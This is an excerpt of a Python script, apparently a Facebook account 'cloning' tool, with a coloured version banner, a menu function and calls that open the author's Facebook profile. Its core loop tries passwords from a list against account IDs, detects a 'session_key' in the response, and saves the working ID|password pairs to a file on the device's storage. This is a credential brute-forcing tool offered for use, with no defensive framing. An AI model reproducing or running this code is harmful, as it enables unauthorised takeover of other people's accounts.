...
os.system('xdg-open https://www.facebook.com/profile.php?id=100054890808230')
#-------------color----------------#
...
║\33[0;41mVERSION    :   1.0.2 \033[0;92m                        ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
...
def TARA_LOVE():
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/profile.php?id=100054890808230');time.sleep(1)
    if option in ['03','3']:
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                print('\r\r \033[1;35m[IDFC-OK] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/IDFC-OK.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
